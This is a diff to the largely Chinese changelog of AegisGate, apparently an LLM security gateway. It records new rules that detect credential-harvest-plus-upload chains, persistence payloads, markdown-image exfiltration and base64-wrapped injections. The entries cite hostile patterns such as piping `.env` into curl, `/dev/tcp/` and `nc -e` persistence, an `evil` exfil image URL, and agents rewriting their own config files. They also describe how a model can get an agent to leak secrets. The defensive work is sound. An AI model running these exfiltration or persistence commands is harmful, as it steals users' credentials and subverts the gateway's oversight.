@@ -2,9 +2,351 @@
 
 All notable changes to this project will be documented in this file.
 
-The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/).
+Section names follow [Keep a Changelog](https://keepachangelog.com/en/1.0.0/), but the file does
+**not** yet follow the rest of the convention: there are no dated version sections, only
+`[Unreleased]` and a `[Previous]` archive, and the same section name recurs several times within
+each. Collapsing those into dated releases is tracked in [ROADMAP.md](ROADMAP.md).
 
 ## [Unreleased]
+
+### Added（外泄链路加固 S0：外泄链路规则，仅改 YAML）
+
+- **`security_filters.yaml` 新增 6 条 `exfil_chain_*` 规则**，判定「采集 + 出口」两种能力在同一条命令里
+  同时成立，堵住「扫盘 → 读凭据 → 发往第三方」这条链。请求侧脱敏本来就挡住了「密钥流向上游」，漏的是
+  反方向：模型指挥 agent 在本机采集数据并发往第三方。
+  - **只判组合，不判措辞**：`curl -F`/`-T`/`--data-binary @`/管道进 `nc`/`Invoke-RestMethod -Method Post`
+    这类外发动作，与 `~/.aws/credentials`、`~/.ssh/id_*`、`.env`、`.netrc`、`.npmrc`、`.git-credentials`、
+    `~/.config/gcloud`、`~/.kube/config`、浏览器 `Login Data` / `cookies.sqlite` / `key4.db` / Keychain、
+    整环境导出（`env` / `printenv` / `Get-ChildItem Env:`）成对出现才命中。
+    单侧命中一律放行——`cat .env`、`curl https://api.github.com` 都是日常动作。
+  - **管道是判据**：`cat .env | curl -d @-` 命中，`source .env && curl ...` 不命中——`&&` 不把数据交给
+    `curl`，两者的能力不同。
+  - **零新增代码**。三处落点复用既有处置通道，都不经风险分：
+
+    | 落点 | 条数 | 命中后 |
+    | --- | --- | --- |
+    | `tool_call_guard.dangerous_param_patterns` | 6 | 按 `review` 抬分并标记复核；并经 `router::_tool_call_guard_patterns` 参与自动遮挡时的工具调用剥离 |
+    | `sanitizer.command_patterns` | 5 | `response_disposition=sanitize`，渲染层据此把整个工具调用替换为占位 |
+    | `sanitizer.force_block_command_patterns` | 2 | 由 `AEGIS_STRICT_COMMAND_BLOCK_ENABLED`（默认 `false`）把关，作灰度开关 |
+
+  - `exfil_chain_secret_in_url_query` **只进第一处**：它命中正文会把流式回答截断，而一条文档示例 URL
+    不该有这个代价；作用在工具调用参数上则没有这个问题。它同时匹配真实密钥形态与 AegisGate 占位符
+    ——占位符出现在 URL query 位置，本身就是外泄企图。
+  - **`force_block_command_patterns` 的两条有额外影响面**：该组同时被 `router::_critical_danger_patterns()`
+    读取，而后者**不受** `AEGIS_STRICT_COMMAND_BLOCK_ENABLED` 把关。因此即使开关关着，命中这两条的工具
+    调用在自动遮挡路径上也会被替换为占位符——与该组既有条目的行为一致。
+  - 规则组数不变（仍 31 组），条数 172 → 185；`security_filters.yaml` 实际 32 组 / 228 → 241 条。
+  - **判据收窄了三处**，都是评审时用日常语料实测出来的误判：
+    - 凭据**文件**必须带点前缀（`\.env`，不是 `[/\.]env`）。松写法把任何 `/env` 路径段都算成读 `.env`，
+      于是 `curl -X POST .../actuator/env`、`--upload-file env.json` 都成了外泄；`.env.example` /
+      `.env.template` 一并排除——模板里没有密钥。
+    - `scp` / `rsync` 从命令表里去掉。它们的 `-F` 是「用这个 ssh config」、`-T` 是「用这个临时目录」，
+      不是上传标志，照旧写法 `scp -F ~/.ssh/config … id_ed25519.pub host:` 会命中。它们本身就是传输命令，
+      基于标志的规则对它们说不出真话，因此本阶段不覆盖 `scp`/`rsync`（管道类规则仍然覆盖 `tar … | curl`）。
+    - `exfil_chain_recursive_secret_harvest` 改为**要求出现密钥关键字**（`sk-`/`AKIA`/`api_key`/`secret`/
+      `*.env` 等）。原先只要求「含 `r` 的短选项」，而 `--color` 就满足，`grep --color=always TODO src/ | curl`
+      被判成凭据收割。
+  - **性能**：两条 upload 规则前置一个廉价 lookahead 预筛（严格超集，不改变判定）。8 KB 重复 `curl -F `
+    上，`upload_credential_store` 从 188 ms 降到 10 ms、`upload_credential_file` 从 37 ms 降到 14 ms。
+    这条路径要紧是因为流式每 `_STREAM_FILTER_CHECK_INTERVAL` 个 chunk 就重跑一次完整 response pipeline。
+  - 新增 `aegisgate/tests/test_exfil_chain_rules.py`（69 条）：17 条攻击语料必须命中，**40 条日常开发语料
+    必须一条都不命中**。后者更重要——它决定这套规则能不能一直开着。每条正则另过
+    `regex_probe` 沙箱与 `test_redos_guard` 的静态预算，并新增一条**锚词重复**的放大预算断言
+    （`test_redos_guard` 的 `_LARGE_INPUT` 里没有 `curl`/`grep`，测不到这类规则的真实代价）。
+  - 回滚：删掉 YAML 里的 `exfil_chain_*` 条目，走热加载，无需重启。
+
+### Added（外泄链路加固 S1：可观测与校准语料）
+
+- **审计记录新增 `exfil` 块**：命中外泄链路规则（`exfil_*` 前缀）时记录 `dimensions` /
+  `chain_complete` / `decision` / `evidence`。此前 `dangerous_param:<tool>` 这个字符串把规则身份
+  丢掉了，下游分不出「读了凭据」和「往外发」。没有命中时该字段整个不出现，普通审计行的形状不变。
+  - **evidence 只存 `rule_id` + 偏移 + 长度，不存原文**。`core/audit.py` 对事件**不做任何脱敏或
+    截断**，而 `audit_log_path` 默认开启；这批规则的证据恰恰是凭据路径和带密钥的 URL。写片段进去
+    等于把一个默认开启的日志悄悄升级成默认关闭那个日志的敏感度。要原文请开
+    `AEGIS_ENABLE_DANGEROUS_RESPONSE_LOG`（默认关），那才是校准语料该走的通道。
+  - **维度由规则 ID 前缀判定**（`exfil_chain_` / `exfil_collect_` / `exfil_egress_` /
+    `exfil_persist_`），不查表——从控制台加一条规则即可自行归类，无需改代码。
+  - `decision` 读的是 `RequestContext` 已经声明的处置，不自行判定；标注的是**非流式**的实现形态
+    （`strip_tool_calls` 没有流式形态，流式下同一份上下文是终止流）。
+  - evidence 上限 20 条，超出时 `evidence_truncated=true` 且 `hit_count` 记真实次数——截断过的
+    列表绝不能读作「只有这么多次」。
+
+- **`/ready` 新增 `risk_gate` 检查**：有效风险阈值被 clamp 到高于 `action_map` 能给出的任何分数
+  （上限 0.96）时上报 `unreachable: security_level=… effective_threshold=…`。
+  - **只上报、不参与就绪判定**：`low` 档的定义就是把阈值推过 clamp，那是有意配置不是故障，在这里
+    让就绪失败等于拒绝服务一个明确要求了这个行为的部署。上报是因为**另一条到达同一状态的路径是
+    回归**——medium 档曾经因为 ×1.30 落到这个状态，而这个条件在任何地方都没有出口，所以长期隐身。
+  - `MAX_ACTION_MAP_RISK_SCORE = 0.96` 是手工维护的副本，由测试扫描各过滤器 `_apply_action` 方法体
+    钉住；新增更高的分数会让这个检查漏报，测试会先失败。
+
+- **新增 `scripts/replay_calibrate.py`**：把录下来的危险响应样本回放到当前规则文件上，回答「这条新
+  规则在本部署真实看到过的流量上会命中什么」。
+  - **不能用 `logs/audit.jsonl` 回放**：审计事件只写 request_id / route / risk / tags / reasons /
+    enforcement_actions / report，**不含任何请求或响应正文**，没有可供正则匹配的文本。语料走
+    `logs/dangerous_response_samples.jsonl`。
+  - 只读，不写；报告只有计数与规则 ID，不打印任何样本文本，可以直接贴进评审。
+  - 语料缺失时明确说明是哪个开关没开，而不是只报一个失败；样本被摘成摘要时单独计数，避免整份
+    摘要语料静默地跑出 0% 命中。
+
+- 新增 `aegisgate/tests/test_exfil_observability.py`（30 条）。
+
+- **评审修复（同一阶段内）**：
+  - `dangerous_response_samples.jsonl` **此前恒为摘要**——`_prepare_event_payload` 默认把 `content` /
+    `dangerous_fragments` 换成 sha256+length，而没有任何生产调用方传 `include_raw_*`，也没有开关。
+    于是 `replay_calibrate.py` 在任何真实语料上都只能报「全是摘要」。新增
+    `AEGIS_DANGEROUS_RESPONSE_LOG_INCLUDE_RAW`（**默认 false**，且只在
+    `AEGIS_ENABLE_DANGEROUS_RESPONSE_LOG` 已开时才被读到）：**两道开关**才存原文，因此「打开样本日志」
+    本身永远不会顺带开始持久化密钥；校准是一个显式、有边界的窗口。
+  - **evidence 的 offset 现在有明确参照系**。`scan_text` 是 `output_text` 与 `tool_call_content`
+    用空格拼起来的，而样本日志分开存两者——落在工具调用区段的命中此前记的偏移会越过正文末尾。现在按
+    `channel` 分别回基，`response_text` 与 `tool_call_arguments` 各自成立。
+  - **只在规范化形态上命中的不再静默漏记**。判定走 `build_haystacks` 的多个形态，而记录只搜原文，于是
+    混淆型命中（NFKC、零宽字符）会 `has_command_payload=True` 却一条 evidence 都不产生——恰好是这批规则
+    最该描述的流量。现在同样搜多形态，并新增 `form` 字段：只有 `raw` 才带 offset，`normalized` 记
+    `null`——「看到规则命中、但指不出位置」是真的，编一个索引不到任何东西的偏移不是。
+  - `/ready` 的 `risk_gate` 改问 `settings.default_policy` 而不是字面量 `"default"`：设了
+    `AEGIS_DEFAULT_POLICY=strict` 的部署此前被告知的是一份它根本不会解析的策略文件的阈值。
+  - `MAX_ACTION_MAP_RISK_SCORE` 的钉子改为读整个实参表达式：原先的 `([0-9.]+)` 正则对三元
+    （`0.58 if … else 0.85`）完全不匹配，那两支是没被钉住的；配置驱动的分值（如 `self._request_risk_floor`）
+    可以从 YAML 抬过常量——正是这个检查要防的静默漂移，现在会直接失败。
+### Added（外泄链路加固 S3：三项独立增量 + 还原侧的位置判据）
+
+四条互不依赖，各自可单独回退。
+
+- **A1 · 解码结果回流。** 多级解码（base64 / hex / URL）出来的文本此前只匹配 `decoded_keywords`
+  那九条关键词，于是把一条注入用 base64 包一层，就能从刚刚扫过外层文本的**每一个**规则族旁边走过去。
+  现在重跑 `direct_patterns` / `system_exfil_patterns` / `tool_call_injection_patterns` 三个指令族，
+  命中记为 `decoded:<规则 ID>`，落进它作为明文时会落进的同一个信号桶——编码过的指令按它本来的分量计。
+  - `html_markdown` / `remote_content` / `spam_noise` 刻意不回流：它们描述文本**怎么写**，解码之后
+    说明不了什么。
+  - 另记一条 `obfuscated:encoded_payload_command`。「有编码载荷」和「载荷里带指令」是两件事，且
+    `obfuscated` 与上述三族分属不同权重桶，不构成重复计分。
+
+- **A2 · 持久化规则（3 条，`tool_call_guard.dangerous_param_patterns`）。** 判定「自启动面 + 拉取远程
+  代码并执行」同时成立：`crontab` / `/etc/cron.*` / `/etc/systemd/system` / `~/.config/systemd/user` /
+  LaunchAgents / LaunchDaemons / `HKCU\...\CurrentVersion\Run` / 启动目录 / `.bashrc` / `.zshrc` /
+  `.profile`，配上 `curl … | sh`、`/dev/tcp/`、`Invoke-Expression`、`nc -e` 之类的载荷。
+  - **单侧一律不判**：写 `.bashrc` 是日常配置，装个 cron 是日常部署。
+  - 第三条针对 agent 改写自身配置（MCP server 定义、`settings.json`、`CLAUDE.md`、skill 文件、
+    `.mcp.json`、`.codex/config.toml`）后接网络命令。
+  - 这三条不在 `_PATH_REFERENCE_PATTERN_IDS` 里，因此**对写文件类工具同样生效**——攻击本身就是那次写入。
+
+- **A3 · markdown 图片外带（1 条正则，登记两处）。** `![](https://evil/?d=KEY)` 渲染即发出请求，不需要
+  点击；而既有的 `html_markdown_patterns` 只有 `<img` 标签，没有 markdown 图片语法。
+  - 规则**要求 query 里带密钥形态或 AegisGate 占位符**，所以既有的「`<img>` 是代码示例里的正常 HTML，
+    不遮挡」这个取舍可以原样保留。
+  - `injection_detector.html_markdown_patterns`：该类别在 `action_map` 里刻意无条目，因此只计分。
+  - `sanitizer.unsafe_markup_patterns`：**执行点**。`OutputSanitizer` 是响应侧最后一个过滤器，跑在
+    `RestorationFilter` 之后，看到的是占位符背后的真实凭据——让那条 URL 走到渲染器就是外泄本身。
+
+- **还原侧的位置判据（3 条）。** `RestorationFilter` 的 exfil 门是「占位符出现 **且** 措辞可疑」；措辞类
+  正则可以改写，不命中就**无条件把占位符还原成真实值写回正文**。也就是说，模型只要把占位符塞进 URL
+  而不带任何可疑措辞，网关会主动把真实密钥写回去。
+  - 新增的三条按**位置**判定：占位符出现在 URL query 值、网络命令的参数位、markdown 图片 URL 里。
+    这些位置正是数据离开本机的地方，换个说法绕不过去。
+  - 测试用的三条语料里没有任何可疑措辞，位置就是全部信号。
+
+- 规则组数不变（仍 31 组），条数 172 → 180；`security_filters.yaml` 实际 32 组 / 228 → 236 条。
+- 新增 `aegisgate/tests/test_exfil_increments.py`（43 条）：12 条攻击语料必须命中，17 条日常开发语料
+  必须一条都不命中；每条新正则另过 `regex_probe` 沙箱与 `test_redos_guard` 的静态预算。
+
+- **评审修复（同一阶段内）**：
+  - **A1 的解码回流不再重跑「序列化格式」类规则**（`mcp_tools_call`、`gemini_function_call`、
+    `bedrock_tool_use`、`tool_uses_json` 等 10 条）。`tool_call_injection` 在 `action_map` 里是 `block`，
+    而 `injection_detector._apply_action` 对 `block` **直接设 disposition、不看阈值**；那几条描述的是真实
+    agent 协议的报文格式，而「把一帧 JSON base64 后贴进 prompt」正是调 MCP 的人天天做的事。回流它们等于
+    把日常的 agent 开发流量变成硬阻断，且载荷不透明、用户看不到原因。划的是这个家族已有的那条线——
+    描述「文本怎么写」的规则解码之后说明不了什么，序列化格式就是「怎么写」；描述**冒充**的
+    （`<invoke name=`、`Action:`/`Action Input:`、`functions.exec`）照旧回流。
+  - **A2 的两半必须由数据流连接，不能只是「同一行相邻」**：中间跨度改为不能跨 `&&`。
+    `echo 'alias ll=...' >> ~/.bashrc && curl -fsSL https://get.docker.com | sh` 是两件普通的安装步骤，
+    `&&` 不把数据交给第二条命令——与 `exfil_chain` 里 `cat .env | curl` 和 `source .env && curl` 的分界同一条理由。
+  - **还原侧的位置判据只对凭据形态的占位符标签生效**（`KEY`/`TOKEN`/`SECRET`/`JWT`/`COOKIE`/… ），
+    不再是所有占位符。命中不是「不还原」而是**整条响应被拦**，而 PII 占位符在正常工作里就会出现在这些位置：
+    用户贴 `https://admin.example.com/users?email=…`，脱敏把地址换成占位符，模型把 URL 回显——把用户自己的
+    邮箱还原回去是往返正常工作，不是外泄。同样位置上的凭据才是。
+  - 语料补 11 条（攻击 14 / 日常 28）：`&&` 相邻的安装一行、以及 `EMAIL`/`PHONE`/`SYS_USERNAME`/`NAME_FIELD`
+    四类 PII 占位符出现在 URL、网络命令参数与 markdown 图片里，全部不得命中。
+
+  - 与 S0 合并后的口径：规则组数仍 31 组，条数 172 → **193**（S0 +13、S3 +8）；`security_filters.yaml`
+    实际 32 组 / 228 → **249** 条。两个分支各自从 172 起算，任何「取一侧」的解冲突都会让
+    `test_rule_group_and_rule_counts_match_docs` 直接红。
+  - **`sanitizer.unsafe_markup_patterns` 补上 S1 的 evidence 记录点**。A3 的执行点在这一组，而 S1 只在
+    `command_patterns` 与 `tool_call_guard` 上记录——审计块会一直报 `chain` 而系统性地缺 `egress`，
+    而维度拆分正是这条记录存在的理由：照它做校准会得出「出口侧从不命中」的结论。
+### Fixed（外泄链路加固 S2：三条机制缺陷）
+
+补规则解决不了这三条——它们是机制问题，不先修的话新增的任何规则都会落进同一个空转路径。
+
+- **R2 · `request_sanitizer` 命中窃密意图后不再走空转分支。** `_apply_action` 只往
+  `enforcement_actions` 追加一行字符串，而 `action_map` 里 `secret_exfiltration` /
+  `privilege_escalation` / `rule_bypass` 都配成 `review`——于是命中这三类的请求只产生一行日志，
+  别的什么都没有。同一文件上方的 `leak_check` 分支是同一个形状的正确写法（review 档也抬 risk
+  并打标）；两个分支不对称是遗漏，不是设计。
+  - 抬到 **0.6，与 `leak_check` 相同**。`review` 在 `action_map` 的词汇表里是一件事，想让这几类
+    更重可以配 `block`；在这里私自发明一套严重度阶梯，只会让控制台统一的 block/review/sanitize
+    措辞去描述一件运行时不做的事——那正是这个分支原本的缺陷。
+  - 0.6 在所有处置闸门之下（响应侧拦截需要 medium 档的 0.85，流式终止需要 0.9），
+    `security_filters.yaml` 里「review = 只记录、不拦截」那句注释仍然成立。标签是 `request_`
+    前缀，碰不到 `_needs_confirmation` 与 `_stream_block_reason` 的 `response_` 前缀判定。
+  - 新增标签：`request_secret_exfiltration` / `request_privilege_abuse` / `request_rule_bypass` /
+    `request_strong_intent_attack`。
+
+- **R3 · 只读工具豁免收窄，并同时给它专用的 `observe` 动作。** `_READ_ONLY_CONTENT_TOOLS` 整类
+  跳过 `dangerous_param_patterns`，而被豁免的恰是外泄链的两端：`read` / `read_file` / `glob` /
+  `grep` 是采集，`webfetch` / `web_fetch` / `web_search` / `browser` / `search` 是出口。
+  - **收窄与配套动作在同一个 commit**——这是原子性问题不是排期问题。沿用现有的
+    `dangerous_param`（`review`）会设 `requires_human_review`，非流式下 `_needs_confirmation`
+    据此走自动遮挡，整个工具调用被替换为 `[CRITICAL-DANGER]` 占位符。而 `read ~/.ssh/config`、
+    `grep -r /etc/passwd` 是日常运维动作，那样改会在上线当天开始改写这类回答。
+  - 因此命中走独立的 `action_map.tool_call_guard.readonly_param`，两处规则源
+    （`security_filters.yaml` 与 `security_rules._DEFAULT_RULES`）都发 `observe`：只记录，
+    **不抬分、不设 `requires_human_review`**。
+  - `_apply_action` 新增显式 `default` 参数：挂载的旧 `security_filters.yaml` 缺这个键时兜底到
+    `observe`，而不是掉进 `default_action: review`——否则「升级」本身就是那个误拦。
+  - `todowrite` / `task` / `submit` / `multi_tool_use.parallel` / `notebook_edit` 既不读文件也不
+    上网，仍整类豁免。
+
+- **R1 · 已由 [#62](https://github.com/ax128/AegisGate/pull/62) 修复，本阶段只补回归钉。**
+  `threshold_multiplier` 的 medium 档已是 1.00，不再重复修。新增的钉子覆盖 `#62` 未覆盖的
+  **两处消费点**——它们在策略阈值之上又加了一层地板：
+    - `filters/sanitizer.py` 的 `max(ctx.risk_threshold, self._block_threshold)`：两半都随档位缩放；
+    - `adapters/openai_compat/stream_utils.py` 的 `max(ctx.risk_threshold, 0.9)`：**0.9 是硬编码、
+      不随档位缩放**，因此在所有把阈值调低的档位上由它说了算。这正是 R1 最初分析漏掉的那一处。
+
+- 新增 `aegisgate/tests/test_exfil_mechanism_fixes.py`（36 条）。
+
+- **评审修复（同一阶段内）**：
+  - **R2 的抬分值不再是 0.6，改为从响应侧的 sanitize 闸门推导（medium 档 = 0.30）。** 原判断只核到两个
+    闸门——响应拦截要 `max(risk_threshold, sanitizer block)`、流式终止要 `max(risk_threshold, 0.9)`，
+    0.6 都够不到，所以看起来安全。真正卡住的是第三个：`OutputSanitizer` 在它的 **sanitize** 阈值
+    （medium 档 0.35）就置 `risk_triggered`，而 `should_sanitize` 一旦成立，**即使一个字都没改写**也会设
+    `response_disposition="sanitize"` 与 `tool_calls_disabled_by_policy`，`_stream_block_reason` 把这个
+    disposition 读作终止信号。于是「run a bash script that builds the image」（`privilege_escalation_en`
+    命中）会让一段毫无危险内容的回答在流式下被截断、工具调用被剥离——而 `strong_intent_patterns` 是一张
+    自然语言动词表，这类请求是 agent 网关最高频的那一批。
+    `leak_check` 保留 0.6：它命中的是请求里真实的密钥形态（`sk-`/`AKIA`/JWT/PEM 头），不是普通英语。
+    新增 7 条端到端断言，直接钉「日常请求 + 干净回答 ⇒ 不 sanitize、不截流」。
+  - R2 的 `_report["action"]` 改为记实际动作，不再硬写 `"review"`——运营方可以把这几类配成别的动作。
+  - **出口侧只读工具（`webfetch`/`web_fetch`/`web_search`/`browser`/`search`）改用 exec-only 模式子集**，
+    跳过 `sensitive_file_access` / `path_traversal` / `ssh_key_access`：它们只上网、不碰文件系统，
+    「怎么读 /etc/passwd」是一个关于文件读的问题而不是一次文件读。与写文件类工具沿用同一条理由。
+  - `readonly_param` 的兜底动作提为 `tool_call_guard.READONLY_PARAM_FALLBACK_ACTION`，并新增一条断言
+    把代码兜底、`security_filters.yaml`、`_DEFAULT_RULES` 三处钉在一起——回滚说明本身就点明了三者走散的代价。
+
+
+### Changed（行为变更：安全级别三档恢复为三档）
+
+- **`AEGIS_SECURITY_LEVEL=medium` 的阈值系数由 ×1.30 改为 ×1.00**，成为中性档：直接使用策略
+  YAML 声明的 `risk_threshold`，`high`（×0.90）与 `low`（×1.60）围绕它调整。
+  - **原缺陷**：`apply_threshold` 把结果 clamp 到 1.0。三个自带策略里 `default` 与 `permissive`
+    的 `risk_threshold` 都是 0.85，`0.85 × 1.30` 与 `0.85 × 1.60` **都** clamp 成 1.0，
+    于是 `medium` 与 `low` **完全等价**；而 `action_map` 的 `block` 最高只把风险分抬到 0.95，
+    所以 `OutputSanitizer` / `RestorationFilter` 里基于分数的拦截分支**永不触发**。
+  - **前后对比**（有效阈值）：
+
+    | 策略 | 档位 | 改前 | 改后 |
+    | --- | --- | --- | --- |
+    | `default` (0.85) | high / medium / low | 0.765 / **1.0** / **1.0** | 0.765 / **0.85** / 1.0 |
+    | `strict` (0.50) | high / medium / low | 0.45 / 0.65 / 0.80 | 0.45 / **0.50** / 0.80 |
+    | `permissive` (0.85) | high / medium / low | 0.765 / **1.0** / **1.0** | 0.765 / **0.85** / 1.0 |
+
+  - **默认部署会提高拦截率**。新增拦截的是两类：
+    1. `restoration` 的 `exfiltration` / `too_many_placeholders` / `stale_mapping` 与
+       `sanitizer` 的 `system_leak`——这四条配的就是 `block`（分数 0.95），控制台一直把它们
+       显示为"拦截"，现在名实相符；
+    2. 有机风险分 ≥ 0.85 的响应。实测有机分上限是 0.889（`weighted_nonlinear_score` 在
+       `k=2.2`、raw=1.0 时），达到 0.85 需要 raw ≥ 0.862，即几乎全部加权信号同时打满，
+       属极少数情形。
+  - `low` 档不变（仍 clamp 到 1.0，基于分数的拦截不触发），符合"极宽松、基本只脱敏"的定位。
+  - **未改** `count_threshold_multiplier`（medium 仍 ×1.30）与 `floor_multiplier`（medium 仍 ×0.85）：
+    两者都不受上限 clamp，没有造成档位坍缩，各自是独立的调节项——一并改会让拦截率变化无法归因。
+  - **选择改系数而非改 `default.yaml`**：改 YAML 只能修 `default` 一个策略，`permissive`
+    仍会 medium≡low；改系数一次修好三个。
+  - 需要回到旧行为：把 `AEGIS_SECURITY_LEVEL` 设为 `low`，或在策略 YAML 里调高 `risk_threshold`。
+  - 新增 `aegisgate/tests/test_security_level_tiers.py`（16 条）。**此前全量测试没有任何一条钉住
+    这些系数**——改动默认拦截率可以零失败地溜过去。
+
+### Changed（行为变更：转发层脱敏判据改为按路由）
+
+- **请求转发层不再按消息角色决定用哪套 PII 集合，改为按路由**。
+  `_sanitize_text_for_upstream_with_hits` 此前在调用方省略 `relaxed_patterns` 时回退到
+  `role in _RESPONSES_RELAXED_REDACTION_ROLES`，而那个集合含**全部**真实角色
+  （system/developer/assistant/user/tool）——所谓"按角色推导"实际等价于"永远用 relaxed 集"，
+  与路由无关。管道层是按路由取集合的，于是在任何非低误报路由上两层判据不同：
+  **打分看到全量 56 项，真正改写外发内容的那一遍只看到 relaxed 集**。
+  - **默认行为变化**：multipart 路由（`/v1/files`、`/v1/images/edits`、`/v1/images/variations`）
+    的表单字段转发前改用**全量集**脱敏，与它们本就在用的打分集合一致。这是**增加**脱敏。
+    文件内容仍不参与请求侧脱敏，只有同请求的表单字段参与。
+  - 其余转发入口（chat messages、Anthropic `system`、Responses `instructions`、工具定义、
+    Responses `input`）只走对话路由，判据结果不变，但不再依赖角色。
+  - 五个入口签名改为接收 `route: str` 而非布尔：路由→集合的映射只有一份实现，调用方无法把
+    映射关系写错。`relaxed_patterns` 在底层两个函数上改为**必填**，遗漏即 `TypeError`，
+    不再静默取 relaxed。
+  - 删除 `_RESPONSES_RELAXED_REDACTION_ROLES`。
+  - 新增 `aegisgate/tests/test_forward_redaction_route_derived.py`（18 条）。
+
+### Changed（行为变更：请求侧脱敏规则集收敛）
+
+- **V2 请求脱敏改为读取 `redaction.relaxed_pii_ids`**，不再使用硬编码的 `V2_RELAXED_PII_IDS`。
+  此前编辑该 YAML 键只影响 V1，V2 岿然不动，且配置面上没有任何迹象能让人发现这一点——
+  文档"其余路由跑完整规则集"对 V2 也因此长期失真。
+  - 实测两侧在 `pii_patterns` 口径上**只差 `COOKIE_SESSION` 一项**：V2 是 V1 的超集。
+    另外两项 `AUTH_BEARER` / `FIELD_SECRET` 属 `field_value_patterns` 层，两侧本就无条件运行——
+    V2 只是把它们塞进了一个名为"PII id 集"的常量来表达"恒开"。
+  - 因此把 `COOKIE_SESSION` 并入共享默认集（12 → 13 项）完成收敛，**V1 与 V2 都不丢覆盖**。
+  - **默认行为变化**：V1 的三条对话路由（`/v1/chat/completions`、`/v1/responses`、`/v1/messages`）
+    现在也会脱敏 `COOKIE_SESSION`（形如 `sid=…` / `session_id: …` / `set-cookie: …`）。
+    这是**增加**脱敏。若你的对话内容里有形似 session id 的字符串且不希望被替换，
+    可在 `security_filters.yaml` 的 `relaxed_pii_ids` 中显式列出不含该 id 的集合。
+  - V2 的 field 层改为无条件运行（与 V1 管道层一致），不再受 PII 集合增删影响。
+  - 新增 `aegisgate/tests/test_relaxed_pii_convergence.py`：钉住"V2 跟随 YAML"、"field 层不被 PII 集
+    门控"、"没有一侧丢覆盖"，以及"每个规则派生的 lru_cache 都挂进了热重载失效链"。
+
+### Fixed（文档对齐审计）
+
+- **`AEGIS_CONFIG_DIR` 布局下密钥轮换静默失效**：控制台密钥页用 `Path.cwd()/"config"` 定位密钥文件，
+  而 `storage/crypto` 读 `AEGIS_CONFIG_DIR`。两者不一致时，轮换把新 Fernet 密钥写到 `crypto` 从不读的
+  位置——界面报轮换成功，旧密钥继续生效。三处解析器（`crypto`、`config/redact_values`、控制台密钥页）
+  收敛到 `aegisgate/config/paths.config_dir()`。此前该缺陷只以 `strict=True` 的 xfail 标记存在于
+  `test_ui_key_rotate_honours_aegis_config_dir`，标记已移除。默认部署（compose 与裸机在仓库根启动）
+  两条路径本就重合，不受影响。
+- **Docker 下 `AEGIS_PORT` 不生效**：`Dockerfile` 的 `CMD` 硬编码 `--port 18080`，而 `settings.port`
+  只用于渲染客户端 Base URL。按 README_zh §4「改三处」操作会得到一个监听 18080、映射却指向新端口的容器。
+  启动命令改读 `${AEGIS_PORT:-18080}`；绑定地址仍固定 `0.0.0.0`（容器的网络边界是端口映射，且
+  `AEGIS_HOST` 默认 `127.0.0.1`，跟随它会让一份标准 `.env` 产出不可达的容器）。
+- **控制台文档页由黑名单改为白名单**：此前服务根目录下除少数具名排除项外的全部 `*.md`。`.gitignore`
+  里的本地报告 `OPTIMIZATION_PLAN.md`、`task_plan.md`、`notes.md`、`FINAL_REPORT.md` 从未在排除列表里，
+  开发机上存在这些文件时会被有会话的用户读到。黑名单只能列出已经想到的文件，改为白名单后新增文件默认不服务。
+
+### Added（文档对齐审计）
+
+- **单进程约束的运行时信号**（ROADMAP R4 第 1 层）：新增 `aegisgate/core/process_identity.py`。
+  启动日志与 `/health`、`/ready` 都带 `pid` 与 `instance`；检测到 `WEB_CONCURRENCY` /
+  `UVICORN_WORKERS` / `GUNICORN_WORKERS` / `GUNICORN_CMD_ARGS` / `--workers N` 大于 1 时打 ERROR，
+  并在探针 body 里带 `multiprocess_warning`。**只告警，不阻止启动**——worker 子进程通常看不到父进程
+  的启动参数，硬拦会同时制造漏检与误检两种反向故障。
+- 三条文档守护测试：规则工作台的组数/条数按 `_PANEL_OWNED_SECTIONS` 扣除后再比对（此前从 YAML 计数，
+  测试绿而文案错）；`request_redaction/settings` 的强制 `If-Match` 与文档描述绑定；控制台文档页白名单
+  与仓库根对齐。`ROADMAP.md` 纳入链接/锚点检查（但排除在配置项检查外——它需要指名已删除的字段）。
+
+### Changed（文档对齐审计）
+
+- `core/confirmation_flow.py` → `core/block_reasons.py`：yes/no 确认流程移除后，该模块只做
+  reason→文案映射，文件名是最后一处误导。
+- 请求侧脱敏在文档中由「V1/V2 两桶」改为**六执行面**模型（README、README_zh、WEBUI-QUICKSTART）。
+  两桶叙述表达不出两件事：对话路由的**打分**跑全量集而**转发层**跑 relaxed 集；`/v2/` 跑的是另一套
+  硬编码 15 项、完全不读 `relaxed_pii_ids`。原文档称「其余路由跑完整规则集」，对 v2 不成立。
+- `README_zh.md` 错误响应格式由「两类」更正为三类，补上安全边界拒绝包裹（无 `request_id`）。
+- `gw_tokens.json` 在 `README_zh.md` 与 `config/README.md` 中原写「重启后生效」，实际在热重载
+  watcher 内，即时生效；`config/README.md` 的表格与文末说明本就是对的，属同文件自相矛盾。
+- `README_zh.md §上游接入` 收敛为上游表 + 三场景判断依据，细节下沉到 `UPSTREAM-QUICKSTART.md`
+  （ROADMAP 单点待办中记录的重复项）。
+- `config/.env.example` 补齐 16 项此前无处可查的配置（含 `AEGIS_HOST`/`AEGIS_PORT`、
+  `AEGIS_PENDING_DATA_TTL_SECONDS`、`AEGIS_NONCE_CACHE_BACKEND` 等）。
+- `README.md` 架构图的过滤器顺序与 `_build_pipeline()` 对齐（此前与该文件自己的 Security Pipeline
+  章节矛盾），并补上运维端点表、`/__gw__/add|remove`、launcher 与改端口章节。
+- CHANGELOG 顶部不再声称遵循 Keep a Changelog——本文件目前没有带日期的版本节。
 
 ### Added
 
